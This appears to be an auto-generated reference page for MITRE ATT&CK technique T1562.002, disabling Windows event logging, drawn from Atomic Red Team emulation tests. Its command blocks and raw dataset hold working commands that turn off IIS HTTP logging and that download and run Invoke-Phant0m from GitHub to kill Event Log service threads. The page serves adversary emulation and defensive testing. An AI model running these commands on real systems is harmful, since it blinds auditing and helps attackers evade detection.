
# Disable Windows Event Logging

## Description

### MITRE Description

> Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.

Adversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.

## Aliases

```

```

## Additional Attributes

* Bypass: ['Log analysis']
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1562/002

## Potential Commands

```
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
$output = "$env:TEMP\Invoke-Phant0m.ps1"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
C:\Windows\System32\inetsrv\appcmd.exe set config "Default Web Site" /section:httplogging /dontLog:true
```

## Commands Dataset

```
[{'command': 'C:\\Windows\\System32\\inetsrv\\appcmd.exe set config "Default '
             'Web Site" /section:httplogging /dontLog:true\n',
  'name': None,
  'source': 'atomics/T1562.002/T1562.002.yaml'},
 {'command': 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy '
             'RemoteSigned -ErrorAction Ignore\n'
             '$url = '
             '"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"\n'
             '$output = "$env:TEMP\\Invoke-Phant0m.ps1"\n'
             '$wc = New-Object System.Net.WebClient\n'
             '$wc.DownloadFile($url, $output)\n'
             'cd $env:TEMP\n'
             'Import-Module .\\Invoke-Phant0m.ps1\n'
             'Invoke-Phant0m',
  'name': None,
  'source': 'atomics/T1562.002/T1562.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Impair Defenses: Disable Windows Event Logging': {'atomic_tests': [{'auto_generated_guid': '69435dcf-c66f-4ec0-a8b1-82beb76b34db',
                                                                                              'description': 'Disables '
                                                                                                             'HTTP '
                                                                                                             'logging '
                                                                                                             'on '
                                                                                                             'a '
                                                                                                             'Windows '
                                                                                                             'IIS '
                                                                                                             'web '
                                                                                                             'server '
                                                                                                             'as '
                                                                                                             'seen '
                                                                                                             'by '
                                                                                                             'Threat '
                                                                                                             'Group '
                                                                                                             '3390 '
                                                                                                             '(Bronze '
                                                                                                             'Union).\n'
                                                                                                             'This '
                                                                                                             'action '
                                                                                                             'requires '
                                                                                                             'HTTP '
                                                                                                             'logging '
                                                                                                             'configurations '
                                                                                                             'in '
                                                                                                             'IIS '
                                                                                                             'to '
                                                                                                             'be '
                                                                                                             'unlocked.\n',
                                                                                              'executor': {'cleanup_command': 'if(Test-Path '
                                                                                                                              '"C:\\Windows\\System32\\inetsrv\\appcmd.exe"){\n'
                                                                                                                              '  '
                                                                                                                              'C:\\Windows\\System32\\inetsrv\\appcmd.exe '
                                                                                                                              'set '
                                                                                                                              'config '
                                                                                                                              '"#{website_name}" '
                                                                                                                              '/section:httplogging '
                                                                                                                              '/dontLog:false '
                                                                                                                              '*>$null\n'
                                                                                                                              '}\n',
                                                                                                           'command': 'C:\\Windows\\System32\\inetsrv\\appcmd.exe '
                                                                                                                      'set '
                                                                                                                      'config '
                                                                                                                      '"#{website_name}" '
                                                                                                                      '/section:httplogging '
                                                                                                                      '/dontLog:true\n',
                                                                                                           'name': 'powershell'},
                                                                                              'input_arguments': {'website_name': {'default': 'Default '
                                                                                                                                              'Web '
                                                                                                                                              'Site',
                                                                                                                                   'description': 'The '
                                                                                                                                                  'name '
                                                                                                                                                  'of '
                                                                                                                                                  'the '
                                                                                                                                                  'website '
                                                                                                                                                  'on '
                                                                                                                                                  'a '
                                                                                                                                                  'server',
                                                                                                                                   'type': 'string'}},
                                                                                              'name': 'Disable '
                                                                                                      'Windows '
                                                                                                      'IIS '
                                                                                                      'HTTP '
                                                                                                      'Logging',
                                                                                              'supported_platforms': ['windows']},
                                                                                             {'auto_generated_guid': '41ac52ba-5d5e-40c0-b267-573ed90489bd',
                                                                                              'description': 'Kill '
                                                                                                             'Windows '
                                                                                                             'Event '
                                                                                                             'Log '
                                                                                                             'Service '
                                                                                                             'Threads '
                                                                                                             'using '
                                                                                                             'Invoke-Phant0m. '
                                                                                                             'WARNING '
                                                                                                             'you '
                                                                                                             'will '
                                                                                                             'need '
                                                                                                             'to '
                                                                                                             'restart '
                                                                                                             'PC '
                                                                                                             'to '
                                                                                                             'return '
                                                                                                             'to '
                                                                                                             'normal '
                                                                                                             'state '
                                                                                                             'with '
                                                                                                             'Log '
                                                                                                             'Service. '
                                                                                                             'https://artofpwn.com/phant0m-killing-windows-event-log.html',
                                                                                              'executor': {'cleanup_command': 'Write-Host '
                                                                                                                              '"NEED '
                                                                                                                              'TO '
                                                                                                                              'Restart-Computer '
                                                                                                                              'TO '
                                                                                                                              'ENSURE '
                                                                                                                              'LOGGING '
                                                                                                                              'RETURNS" '
                                                                                                                              '-fore '
                                                                                                                              'red',
                                                                                                           'command': 'Set-ExecutionPolicy '
                                                                                                                      '-Scope '
                                                                                                                      'CurrentUser '
                                                                                                                      '-ExecutionPolicy '
                                                                                                                      'RemoteSigned '
                                                                                                                      '-ErrorAction '
                                                                                                                      'Ignore\n'
                                                                                                                      '$url '
                                                                                                                      '= '
                                                                                                                      '"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"\n'
                                                                                                                      '$output '
                                                                                                                      '= '
                                                                                                                      '"$env:TEMP\\Invoke-Phant0m.ps1"\n'
                                                                                                                      '$wc '
                                                                                                                      '= '
                                                                                                                      'New-Object '
                                                                                                                      'System.Net.WebClient\n'
                                                                                                                      '$wc.DownloadFile($url, '
                                                                                                                      '$output)\n'
                                                                                                                      'cd '
                                                                                                                      '$env:TEMP\n'
                                                                                                                      'Import-Module '
                                                                                                                      '.\\Invoke-Phant0m.ps1\n'
                                                                                                                      'Invoke-Phant0m',
                                                                                                           'elevation_required': True,
                                                                                                           'name': 'powershell'},
                                                                                              'name': 'Kill '
                                                                                                      'Event '
                                                                                                      'Log '
                                                                                                      'Service '
                                                                                                      'Threads',
                                                                                              'supported_platforms': ['windows']}],
                                                                            'attack_technique': 'T1562.002',
                                                                            'display_name': 'Impair '
                                                                                            'Defenses: '
                                                                                            'Disable '
                                                                                            'Windows '
                                                                                            'Event '
                                                                                            'Logging'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Restrict File and Directory Permissions](../mitigations/Restrict-File-and-Directory-Permissions.md)

* [User Account Management](../mitigations/User-Account-Management.md)
    
* [Restrict Registry Permissions](../mitigations/Restrict-Registry-Permissions.md)
    

# Actors


* [Threat Group-3390](../actors/Threat-Group-3390.md)

